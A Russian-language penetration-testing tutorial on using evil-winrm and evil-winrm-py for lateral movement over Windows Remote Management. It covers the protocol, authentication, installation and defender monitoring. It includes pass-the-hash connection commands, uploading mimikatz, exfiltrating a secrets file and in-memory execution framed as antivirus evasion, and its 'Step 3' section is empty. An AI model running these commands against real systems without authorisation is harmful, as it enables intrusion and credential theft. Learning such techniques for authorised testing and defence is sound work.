# evil-winrm: Инструмент интерактивного взаимодействия с WinRM в рамках тестирования на проникновение

## Контекст и базовые понятия

Windows Remote Management (WinRM) является нативным протоколом удаленного управления Microsoft, реализующим стандарт WS-Management (WS-Man). Протокол использует SOAP-сообщения, передаваемые поверх HTTP (порт 5985) или HTTPS (порт 5986), что делает его устойчивым к фильтрации межсетевыми экранами по сравнению с протоколами, использующими динамические порты (например, RPC). В контексте тестирования на проникновение WinRM представляет собой критически важный вектор горизонтального перемещения (Lateral Movement), классифицируемый в матрице MITRE ATT&CK как техника T1021.006.

Инструмент `evil-winrm` (и его современный форк `evil-winrm-py`) служит основным средством эксплуатации этого вектора для получения интерактивной оболочки PowerShell на удаленной системе. Понимание различий между самими протоколами, механизмами аутентификации и историей развития инструмента необходимо для корректного применения в различных сетевых средах.

### Разграничение понятий: WinRM, PowerShell Remoting и WS-Management

Часто термины WinRM и PowerShell Remoting используются как синонимы, однако функционально они различаются. WinRM — это инфраструктурный сервис и протокол (транспортный уровень и модель управления). PowerShell Remoting — это надстройка (PowerShell Session), которая использует WinRM в качестве транспорта для выполнения команд PowerShell на удаленных узлах.

| Сущность | Уровень модели OSI / Стек | Функция | Роль в контексте атаки |
| :--- | :--- | :--- | :--- |
| **WS-Management (WS-Man)** | Прикладной (SOAP/XML) | Стандарт описания и взаимодействия с управляемыми узлами. Определяет структуру SOAP-запросов. | Формат пакета, который генерирует `evil-winrm`. Атакующий манипулирует SOAP-оберткой для передачи PowerShell-команд. |
| **WinRM (Windows Remote Management)** | Сервис / Протокол (HTTP/HTTPS) | Агент на стороне Windows, принимающий SOAP-запросы, аутентифицирующий пользователя и делегирующий выполнение. | Цель сканирования (порты 5985/5986). Точка входа для легитимного или вредоносного подключения. |
| **PowerShell Remoting (PSRP)** | Надстройка над WinRM | Позволяет передавать объекты PowerShell, а не просто сырой вывод команд. Использует протокол PSRP поверх WinRM. | Позволяет `evil-winrm` работать в режиме интерактивной оболочки с поддержкой tab-completion и цветным выводом. |
| **evil-winrm (Ruby/Python)** | Клиентская утилита | Реализация клиента WS-Man/PSRP на языке Ruby (оригинал) или Python (форк). | Инструмент атакующего. Управляет жизненным циклом сессии, аутентификацией и передачей данных. |

### Эволюция инструментария: от Ruby к Python

Исторически основным инструментом считался `evil-winrm` на Ruby. Однако, как отмечается в ретроспективе разработчика Aditya Telange, оригинальная версия имела ряд архитектурных ограничений:
1.  **Зависимости:** Требовала установки Ruby и специфических gem-зависимостей, что затрудняло развертывание в минималистичных средах (например, в Docker-контейнерах или на чистых Linux-системах без предустановленного Ruby).
2.  **Производительность:** Выполнение команд и отмена долгих операций были медленными. Обработка прерываний (Ctrl+C) часто оставляла сессию в нестабильном состоянии.
3.  **Передача файлов:** Скорость загрузки/выгрузки файлов была низкой, особенно для больших объемов данных.
4.  **Readline:** Функция автодополнения путей зависела от того, был ли скомпилирован Ruby с поддержкой библиотеки `readline`.

Форк `evil-winrm-py`, написанный на Python с использованием библиотеки `pypsrp`, решил эти проблемы, предоставив более быстрый, отзывчивый и кроссплатформенный инструмент. Он поддерживает те же механизмы аутентификации (NTLM, Kerberos, сертификаты, Pass-the-Hash), но предлагает улучшенную обработку прерываний, прогресс-бары для файлов и встроенное автодополнение для локальных и удаленных путей.

### Сценарии применения в тестировании на проникновение

WinRM используется атакующими по нескольким причинам:
*   **Обход ограничений:** В отличие от PsExec (SMB), WinRM работает поверх HTTP/HTTPS, что часто проходит через фаерволы, блокирующие SMB (445/tcp).
*   **Безопасность аутентификации:** При использовании Kerberos учетные данные не передаются в открытом виде на целевую машину, что снижает риск перехвата.
*   **Интерактивность:** В отличие от однократных команд через `Invoke-Command` или `netexec`, `evil-winrm` предоставляет полноценную интерактивную оболочку, что критично для навигации по файловой системе и загрузки инструментов.
*   **In-Memory Execution:** Поддержка загрузки DLL и выполнения EXE в памяти без записи на диск, что затрудняет обнаружение антивирусами.

## Внутреннее устройство предмета

Для эффективного использования `evil-winrm` необходимо понимать архитектуру взаимодействия клиента и сервера, механизмы аутентификации и внутреннюю структуру SOAP-запросов, которые генерирует инструмент.

### Архитектура взаимодействия WinRM и клиента

Процесс подключения через `evil-winrm` состоит из нескольких этапов: установление TCP-соединения, рукопожатие WS-Management и аутентификация.

```text
[Attacker: evil-winrm-py]                  [Target: WinRM Service]
        |                                          |
        |--- TCP Connect (Port 5985/5986) --------->|
        |                                          |
        |--- WS-Man Handshake (SOAP Identify) ------>|
        |  <--- WS-Man Response (Capabilities) ------|
        |                                          |
        |--- Authentication Negotiation ------------>|
        |  (Kerberos / NTLM / Certificate)           |
        |  <--- Challenge / Ticket Validation -------|
        |                                          |
        |--- PSRP Session Establishment ------------>|
        |  <--- Session ID / Context ID -------------|
        |                                          |
        |--- [Interactive Shell Loop] -------------->|
        |  (Send Command) -> (Receive Output)        |
        |                                          |
        |--- Close Session ------------------------->|
```

Ключевым компонентом на стороне цели является процесс `wsmprovhost.exe`. При создании сессии PowerShell Remoting WinRM запускает этот процесс от имени аутентифицированного пользователя. Это отличает WinRM от других методов (например, WMI или PsExec), где команды часто выполняются в контексте службы `svchost.exe` или `lsass.exe`. Наличие `wsmprovhost.exe` в процессах цели является прямым индикатором использования PowerShell Remoting.

### Механизмы аутентификации и их особенности

`evil-winrm` поддерживает несколько методов аутентификации, каждый из которых имеет свои технические особенности и ограничения.

1.  **NTLM (NT LAN Manager):**
    *   *Применение:* Рабочие группы (Workgroup) или кросс-доменные связи без доверия.
    *   *Механизм:* Трехэтапный рукопошаг (Negotiate, Challenge, Authenticate).
    *   *Особенность:* Требует, чтобы целевой хост был добавлен в список `TrustedHosts` на стороне клиента, если используется HTTP. Для HTTPS это требование снимается.
    *   *Pass-the-Hash:* Поддерживается передача NT-хэша (`-H <HASH>`), что позволяет аутентифицироваться без знания пароля.

2.  **Kerberos:**
    *   *Применение:* Доменные среды (Active Directory).
    *   *Механизм:* Использование TGT (Ticket Granting Ticket) и SPN (Service Principal Name).
    *   *SPN:* По умолчанию WinRM регистрирует SPN `HTTP/<hostname>`. Если этот SPN уже занят другим сервисом, аутентификация может завершиться ошибкой `0x80090322`. В таких случаях требуется использование порта-квалифицированного SPN (`HTTP/<hostname>:5985`) или переключение на `WSMAN/<hostname>`.
    *   *Особенность:* Не передает хэши паролей по сети, что делает его более безопасным и устойчивым к перехвату.

3.  **Сертификаты (Certificate-based Auth):**
    *   *Применение:* Высокобезопасные среды, PKI.
    *   *Механизм:* Клиент предоставляет клиентский сертификат, который WinRM валидирует через доверенные корневые центры.
    *   *Особенность:* Позволяет аутентифицироваться без учетных данных пользователя, если сертификат доверен.

4.  **LocalAccountTokenFilterPolicy:**
    *   *Проблема:* В Windows по умолчанию локальные администраторы не могут выполнять удаленные команды через WinRM на других машинах из-за ограничений UAC (Remote Restriction).
    *   *Решение:* На целевой машине должен быть установлен реестровый ключ `LocalAccountTokenFilterPolicy = 1` (значение DWORD), который отключает фильтрацию токенов для локальных учетных записей.

### Структура SOAP-запроса в WinRM

`evil-winrm` формирует SOAP-запросы для выполнения команд. Понимание структуры этих запросов полезно для анализа трафика и обхода простых WAF/IDS.

```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
            xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
    <a:MessageID>uuid:...-...</a:MessageID>
    <a:To>http://target:5985/wsman</a:To>
    <w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <a:ReplyTo>
      <a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
  </s:Header>
  <s:Body>
    <p:Shell>
      <p:CommandId>...</p:CommandId>
      <p:CommandLine>whoami</p:CommandLine>
    </p:Shell>
  </s:Body>
</s:Envelope>
```

Ключевые поля:
*   `a:Action`: Определяет тип операции (создание сессии, выполнение команды, получение вывода, удаление сессии).
*   `w:ResourceURI`: Указывает на тип исполняемого ресурса (`cmd` для командной строки или `powershell` для PowerShell).
*   `p:CommandLine`: Содержит саму команду. В случае PowerShell команда может быть зашифрована или закодирована в Base64 для обхода простых фильтров.

## Применение и работа с предметом

Практическая работа с `evil-winrm` включает установку, настройку окружения, выполнение аутентификации и использование встроенных функций для передачи файлов и выполнения кода.

### Установка и подготовка окружения

Для использования `evil-winrm-py` требуется среда Python 3.6+. Рекомендуется использовать изолированные окружения (`venv`, `pipx`) для избежания конфликтов зависимостей.

```bash
# Установка через pip
pip install evil-winrm-py

# Для поддержки Kerberos на Debian/Ubuntu
sudo apt install gcc python3-dev libkrb5-dev krb5-pkinit
pip install evil-winrm-py[kerberos]

# Проверка версии
evil-winrm-py --version
```

### Базовые команды подключения

Синтаксис инструмента позволяет гибко настраивать параметры подключения.

```bash
# Подключение с паролем (NTLM)
evil-winrm-py -i 192.168.1.100 -u administrator -p 'P@ssw0rd'

# Подключение с доменным пользователем
evil-winrm-py -i 192.168.1.100 -u 'CORP\administrator' -p 'P@ssw0rd'

# Подключение с использованием NT-хэша (Pass-the-Hash)
evil-winrm-py -i 192.168.1.100 -u administrator -H 'E8A96B1145A8B5E45A8B5E45A8B5E45A'

# Подключение через HTTPS (порт 5986)
evil-winrm-py -i 192.168.1.100 -u administrator -p 'P@ssw0rd' -S

# Подключение с указанием нестандартного порта
evil-winrm-py -i 192.168.1.100 -u administrator -p 'P@ssw0rd' -P 8080

# Подключение с использованием Kerberos (требует наличия TGT в кэше)
evil-winrm-py -i 192.168.1.100 -u administrator -k
```

### Работа с файловой системой и загрузка инструментов

Одной из сильных сторон `evil-winrm` является встроенная поддержка передачи файлов. Команды `upload` и `download` используют прогресс-бары и MD5-верификацию для обеспечения целостности.

```powershell
# В интерактивной оболочке evil-winrm:

# Загрузка файла на целевую машину
upload /path/to/local/mimikatz.exe C:\Temp\mimikatz.exe

# Скачивание файла с целевой машины
download C:\Temp\secrets.txt /path/to/local/secrets.txt

# Загрузка PowerShell-скрипта для выполнения
upload /path/to/local/script.ps1 C:\Temp\script.ps1
run C:\Temp\script.ps1
```

### In-Memory Execution и загрузка DLL

Инструмент поддерживает выполнение кода в памяти без записи на диск, что является важным элеком обхода антивирусного ПО.

```powershell
# Загрузка DLL в память и выполнение
loaddll /path/to/local/dll.dll

# Выполнение EXE в памяти
runexe /path/to/local/exe.exe

# Выполнение PowerShell-скрипта в памяти
loadps /path/to/local/script.ps1
```

### Типичные ошибки и подводные камни

1.  **Ошибка аутентификации при использовании IP-адреса с Kerberos:** Kerberos требует совпадения имени хоста с SPN. Подключение по IP-адресу принудительно переключает аутентификацию на NTLM. Для использования Kerberos необходимо указывать FQDN.
2.  **Проблема TrustedHosts при NTLM:** Если используется HTTP и NTLM, и целевой хост не находится в домене, клиент должен добавить его в `TrustedHosts`. Это можно сделать программно или через реестр.
3.  **Ограничения локальных учетных записей:** Локальные администраторы не могут выполнять удаленные команды на других машинах без настройки `LocalAccountTokenFilterPolicy`.
4.  **Проблема двойного перехода (Double-Hop):** При использовании PowerShell Remoting из одной удаленной сессии в другую (например, из `evil-winrm` на сервере A подключиться к серверу B) возникает проблема делегирования. Требуется настройка CredSSP или Kerberos Constrained Delegation.

## Сквозной практический пример: Горизонтальное перемещение через WinRM с использованием Pass-the-Hash

**Исходные условия:**
*   **Среда:** Корпоративная сеть Active Directory.
*   **Цель:** Сервер `SRV01.corp.local` (IP: 192.168.1.50), порт 5985 открыт.
*   **Инструменты:** `evil-winrm-py`, `netexec` (для разведки), `Mimikatz` (для получения хэша).
*   **Роль:** Пентестер, имеющий доступ к рабочей станции `WORKSTATION01` и получивший NT-хэш локального администратора `Administrator` с помощью Mimikatz.
*   **Сценарий:** Выполнение горизонтального перемещения с рабочей станции на сервер `SRV01` с использованием полученного хэша.

### Шаг 1: Разведка и подтверждение доступности WinRM

Перед попыткой подключения необходимо убедиться, что служба WinRM активна и доступна.

```bash
# Использование netexec для быстрой проверки аутентификации и выполнения команды
nxc winrm 192.168.1.50 -u Administrator -H E8A96B1145A8B5E45A8B5E45A8B5E45A -x "whoami"
```

**Ожидаемый вывод:**
```text
192.168.1.50    5985    SRV01      [*] Windows 10.0 Build 19041 (name:SRV01) (domain:CORP)
192.168.1.50    5985    SRV01      [+] CORP\Administrator:E8A96B1145A8B5E45A8B5E45A8B5E45A (Pwn3d!)
192.168.1.50    5985    SRV01      [+] Executed command
192.168.1.50    5985    SRV01      [+] whoami: CORP\Administrator
```
*Результат:* Успешная аутентификация подтверждает, что хэш валиден, и служба WinRM доступна.

### Шаг 2: Подключение через evil-winrm-py

Используем `evil-winrm-py` для получения интерактивной оболочки.

```bash
evil-winrm-py -i 192.168.1.50 -u Administrator -H E8A96B1145A8B5E45A8B5E45A8B5E45A
```

**Ожидаемый вывод:**
```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
*Результат:* Установлена интерактивная сессия PowerShell.

### Шаг 3: Разведка внутри сессии

## Аналитический вывод

WinRM является мощным и широко используемым механизмом удаленного управления в инфраструктурах Active Directory, что делает его привлекательной целью для атакующих. Инструмент `evil-winrm-py` представляет собой современный, эффективный и кроссплатформенный клиент для эксплуатации этого протокола, превосходящий оригинальную Ruby-версию по скорости, стабильности и удобству использования. Поддержка различных механизмов аутентификации (NTLM, Kerberos, сертификаты, Pass-the-Hash) позволяет атакующим гибко адаптироваться к различным сетевым конфигурациям.

Для защитников критически важно мониторить активность WinRM, особенно несанкционированные подключения и аномальную активность процессов `wsmprovhost.exe`. Внедрение принципа наименьших привилегий, ограничение доступа к портам 5985/5986 и использование HTTPS для шифрования трафика являются базовыми мерами защиты. Обнаружение использования `evil-winrm` может быть реализовано через анализ логов Windows (Event ID 4103, 800) и сетевой трафик, содержащий SOAP-запросы к WinRM.
